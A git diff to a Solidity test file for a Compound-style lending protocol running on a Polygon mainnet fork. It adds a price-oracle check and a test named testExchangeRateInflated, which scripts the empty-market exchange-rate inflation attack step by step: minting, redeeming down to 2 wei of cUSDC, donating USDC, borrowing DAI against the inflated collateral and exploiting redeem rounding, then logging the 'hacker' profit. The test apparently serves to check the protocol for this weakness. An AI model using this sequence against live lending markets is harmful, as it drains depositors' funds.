@@ -6,9 +6,10 @@ import "./helpers/WithPool.sol";
 import { ERC20 } from "solmate/tokens/ERC20.sol";
 import { MockERC20 } from "solmate/test/utils/mocks/MockERC20.sol";
 import { ICToken } from "../external/compound/ICToken.sol";
-import { MasterPriceOracle } from "../oracles/MasterPriceOracle.sol";
+import { MasterPriceOracle, IPriceOracle } from "../oracles/MasterPriceOracle.sol";
 import { FusePoolLensSecondary } from "../FusePoolLensSecondary.sol";
 import "../compound/CTokenInterfaces.sol";
+import { PriceOracle } from "../compound/PriceOracle.sol";
 
 contract MockAsset is MockERC20 {
   constructor() MockERC20("test", "test", 8) {}
@@ -43,7 +44,17 @@ contract MaxBorrowTest is WithPool {
     }
   }
 
-  function testMaxBorrow() public fork(POLYGON_MAINNET) {
+  function testUsdcMarketPrice() public fork(POLYGON_MAINNET) {
+    CErc20Delegate usdcMarket = CErc20Delegate(0xa247FCb127781d7c7339eC659E6929430FE37EC1);
+    Comptroller pool = Comptroller(address(usdcMarket.comptroller()));
+    PriceOracle oracle = pool.oracle();
+
+    uint256 price = oracle.getUnderlyingPrice(usdcMarket);
+
+    assertTrue(price != 0, "price zero");
+  }
+
+  function testExchangeRateInflated() public fork(POLYGON_MAINNET) {
     FusePoolLensSecondary poolLensSecondary = new FusePoolLensSecondary();
     poolLensSecondary.initialize(fusePoolDirectory);
 
@@ -55,8 +66,115 @@ contract MaxBorrowTest is WithPool {
     deployCErc20Delegate(address(vars.usdc), "USDC", "usdc", 0.9e18);
     deployCErc20Delegate(address(vars.dai), "DAI", "dai", 0.9e18);
 
-    // TODO no need to upgrade after the next deploy
-    upgradePool(address(comptroller));
+    vars.allMarkets = comptroller.asComptrollerFirstExtension().getAllMarkets();
+
+    CErc20Delegate usdcMarket = CErc20Delegate(address(vars.allMarkets[0]));
+    CErc20Delegate daiMarket = CErc20Delegate(address(vars.allMarkets[1]));
+
+    vars.cTokens = new address[](1);
+
+    address accountOne = address(256);
+    address accountTwo = address(257);
+
+    vm.prank(usdcWhale);
+    MockERC20(address(vars.usdc)).transfer(accountOne, 1_000_000e6);
+
+    vm.prank(daiWhale);
+    MockERC20(address(vars.dai)).transfer(accountTwo, 1_000_000e18);
+    // 10 000 $ of USDC
+    uint256 usdcAmount = 1e10;
+    // 100 000 $ of DAI
+    uint256 daiAmount = 1e23;
+
+    // deposit some dai that will be tested if it can be borrowed and drained
+    {
+      vm.startPrank(accountTwo);
+      vars.dai.approve(address(daiMarket), 1e36);
+      require(daiMarket.mint(daiAmount) == 0, "mint dai failed");
+      vm.stopPrank();
+    }
+
+    // inflate the ctoken echx rate
+    {
+      vm.startPrank(accountOne);
+      vars.usdc.approve(address(usdcMarket), 1e36);
+      //uint256 cTokensForDepositAmount = (usdcMarket.asCTokenExtensionInterface().exchangeRateStored() * usdcAmount) / 1e18;
+      require(usdcMarket.mint(usdcAmount) == 0, "mint usdc failed");
+      vars.cTokens[0] = address(usdcMarket);
+      comptroller.enterMarkets(vars.cTokens);
+
+      CTokenExtensionInterface asExt = usdcMarket.asCTokenExtensionInterface();
+      uint256 exchRateMint = asExt.exchangeRateCurrent();
+      emit log_named_uint("exchRateMint", exchRateMint);
+
+      uint256 balanceBefore = vars.usdc.balanceOf(accountOne);
+      uint256 allCTokens = usdcMarket.asCTokenExtensionInterface().balanceOf(accountOne);
+      require(usdcMarket.redeem(allCTokens - 2) == 0, "redeem usdc failed");
+      uint256 exchRateRedeem = asExt.exchangeRateCurrent();
+      emit log_named_uint("exchRateRedeem all minus 2", exchRateRedeem);
+      uint256 balanceAfter = vars.usdc.balanceOf(accountOne);
+
+      vars.usdc.transfer(address(usdcMarket), (balanceAfter - balanceBefore) - 2); // leftover: 2 cUSDC
+
+      uint256 exchRateTransfer = asExt.exchangeRateCurrent();
+      emit log_named_uint("exchRateTransfer", exchRateTransfer);
+      vm.stopPrank();
+    }
+
+    //  the exchange rate should now be $5000 USDC per 1 wei of cUSDC
+    uint256 hackerCUsdc = usdcMarket.asCTokenExtensionInterface().balanceOf(accountOne);
+    emit log_named_uint("should be 2 cUSDC left = $10 000 USDC", hackerCUsdc);
+
+    // try to borrow a lot of DAI
+    {
+      // borrow half the max borrowable DAI
+      vm.startPrank(accountOne);
+      uint256 maxBorrowDai = comptroller.getMaxRedeemOrBorrow(accountOne, address(daiMarket), true);
+      emit log_named_uint("max borrow DAI", maxBorrowDai);
+      require(daiMarket.borrow(maxBorrowDai / 2) == 0, "max borrow failed");
+
+      // rounding should now allow almost all the collateral to be redeemed for 1 of the 2 cUSDC
+      uint256 maxRedeemUsdc = comptroller.getMaxRedeemOrBorrow(accountOne, address(usdcMarket), false);
+      emit log_named_uint("max redeem USDC", maxRedeemUsdc);
+      {
+        (, , uint256 shortfall) = comptroller.getAccountLiquidity(accountOne);
+        assertEq(shortfall, 0, "shortfall should be 0 before redeem");
+      }
+
+      //require(usdcMarket.redeemUnderlying(1) == 0, "redeem some underlying usdc");
+      require(comptroller.redeemAllowed(address(usdcMarket), accountOne, 0) == 0, "redeem 0 not allowed");
+
+      uint256 leftoverBalance = usdcMarket.asCTokenExtensionInterface().balanceOf(accountOne);
+      emit log_named_uint("balance after redeem all (should be 1 = $1000 USDC)", leftoverBalance);
+
+      {
+        (, , uint256 shortfall) = comptroller.getAccountLiquidity(accountOne);
+        assertEq(shortfall, 0, "shortfall should be 0 after redeem");
+      }
+
+      vm.stopPrank();
+    }
+
+    emit log_named_uint("hacker usdc balance", vars.usdc.balanceOf(accountOne));
+    emit log_named_uint("hacker dai balance", vars.dai.balanceOf(accountOne));
+    emit log_named_uint("hacker $ balance", vars.dai.balanceOf(accountOne) + vars.usdc.balanceOf(accountOne) * 1e12);
+
+    // 999499998048000000000000
+    // 4500000000000000000000
+    // 994999998048
+  }
+
+  function testMaxBorrow() public fork(POLYGON_MAINNET) {
+    FusePoolLensSecondary poolLensSecondary = new FusePoolLensSecondary();
+    poolLensSecondary.initialize(fusePoolDirectory);
+
+    LiquidationData memory vars;
+    vm.roll(1);
+    vars.usdc = MockAsset(0x2791Bca1f2de4661ED88A30C99A7a9449Aa84174);
+    vars.dai = MockAsset(0x8f3Cf7ad23Cd3CaDbD9735AFf958023239c6A063);
+
+    deployCErc20Delegate(address(vars.usdc), "USDC", "usdc", 0.9e18);
+    deployCErc20Delegate(address(vars.dai), "DAI", "dai", 0.9e18);
 
     vars.allMarkets = comptroller.asComptrollerFirstExtension().getAllMarkets();
 
